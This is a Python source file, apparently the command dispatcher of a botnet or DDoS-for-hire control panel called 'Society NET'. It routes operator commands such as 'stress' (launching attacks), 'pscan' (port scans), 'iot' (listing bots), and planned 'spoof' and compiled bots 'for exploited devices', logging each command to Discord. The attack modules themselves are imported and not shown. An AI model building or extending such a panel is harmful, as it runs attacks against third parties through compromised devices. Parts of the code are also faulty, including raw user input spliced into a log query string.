import os, sys, time

# Files
from ..auth.crud import *
from ..auth.crudFunc import *
from ..Config.main import *
from ..Config.functions import *
from ..banner_system.modify import *
from ..utils.db_lookup import *
from ..utils.CLI import *

# Commands
from .geo import *
from .portscan import *
from .attack import *
from .chatroom import *
from .admin_handler import *
from .msg import *

"""
help list 
_________________
help
whoami
clear
info
passwd
methods
"""

buffer_length = 1024

def CMDHandler(socket, addr):
    if socket in ServerConfig.clients:
        Strings.CurrentUser = ServerUtils.GetCurrentUsername(socket)
        Strings.CurrentIP = ServerUtils.GetCurrentIP(socket)
        Strings.CurrentLvl = ServerUtils.GetCurrentLvl(socket)
        Strings.CurrentMtime = ServerUtils.GetCurrentMaxtime(socket)
        Strings.CurrentConn = ServerUtils.GetCurrentConn(socket)
        Strings.CurrentAdmin = ServerUtils.GetCurrentAdmin(socket)
    try:
        CLI_Control.set_Title(socket, f"Society NET | Operator: {Strings.CurrentUser} | Online Users: {len(ServerConfig.clients)}")
    except:
        print("User disconnected")

  
    # Request for user input 
    data = str(socket.recv(buffer_length).decode()).strip().replace("\r\n", "")

    if data != "":
        print(f"Username: {Strings.CurrentUser} | CMD: " + data + " | Time: " + str(utils.CurrentTime()) + "\n") # Debugging / Removing this later


        if data.lower() == "dashboard":
            socket.send(str(Strings.MainColors['Clear'] + CustomBannerMaker.CreateMOTD(utils.GetMOTD()) + BannerModify.GetBannerFromFile("main") + BannerModify.GetBannerFromFile("dashboard")).encode())
        if data.lower() == "help" or data.lower() == "?":
            socket.send(str(Strings.MainColors['Clear'] + CustomBannerMaker.CreateMOTD(utils.GetMOTD()) + BannerModify.GetBannerFromFile("main") + BannerModify.GetBannerFromFile("help")).encode())
        elif data.lower() == "clear" or data.lower() == "cls":
            socket.send(str(Strings.MainColors['Clear'] + CustomBannerMaker.CreateMOTD(utils.GetMOTD()) + BannerModify.GetBannerFromFile("main")).encode())
        elif data.lower() == "whoami":
            socket.send(str(ServerUtils.GetCurrentUsername(socket)(socket)).encode())
        elif data.lower() == "info":
            socket.send(str(CrudFunctions.MyStats(Strings.CurrentUser)).encode())
        elif "passwd" in data:
            socket.send(str(CrudFunctions.ChangePW(Strings.CurrentUser, data.split(" ")[1])).encode())
        elif data.lower() == "methods":
            socket.send(str(Strings.MainColors['Clear'] + CustomBannerMaker.CreateMOTD(utils.GetMOTD()) + BannerModify.GetBannerFromFile("main") + BannerModify.GetBannerFromFile("methods")).encode())
        elif "geo" in data:
            geo_command(socket, data.split(" "))
        elif "pscan" in data:
            pScan_command(socket, data.split(" "))
        elif "stress" in data:
            temporary_attack(socket, data.split(" "))
            print(data.split(" "))
        elif "spoof" in data:
            #python bot, finishing this later. when i get my new laptop
            socket.send("Coming soon....\r\n".encode())
        elif "bots" in data:
            #(C) compiled bot for exploited devices
            socket.send("Coming soon....\r\n".encode())
        elif data.lower() == "iot":
            bot_list = Strings.show_all_bots()
            socket.send(f"                     [ BOT LIST ]\r\n{bot_list}\r\n".encode())
        elif data.lower() == "users":
            client_list = Strings.show_all_clients()
            socket.send(f"                     [ CLIENTS LIST ]\r\n{client_list}\r\n".encode())
        elif data.lower() == "chatroom":
            WockyChat(socket, addr)
        elif "msg" in data:
            msg_user(socket, data)
        elif data.lower() == "logs":
            socket.send(str(dbLookup.logs(Strings.CurrentUser)).encode())
        elif data.lower() == "hide":
            CLI_EraserControl.HideCursor(socket)
        elif data.lower() == "show":
            CLI_EraserControl.ShowCursor(socket)
        elif "admin" in data:
            admin_command(socket, addr, data)

    
    socket.send(str(f"\x1b[34m╔═[{Strings.CurrentUser}@Society]\r\n\x1b[34m╚════\x1b[31m➢").encode())

    if data != "":
        LogTypes.LogCommand(f"('{Strings.CurrentUser}','{data}','{str(utils.CurrentTime())}')")
        Discord.send_logs(f"[NEW COMMAND]\r\n[User]: {Strings.CurrentUser} | [IP]: {Strings.CurrentIP}\r\n[COMMAND]: {data}")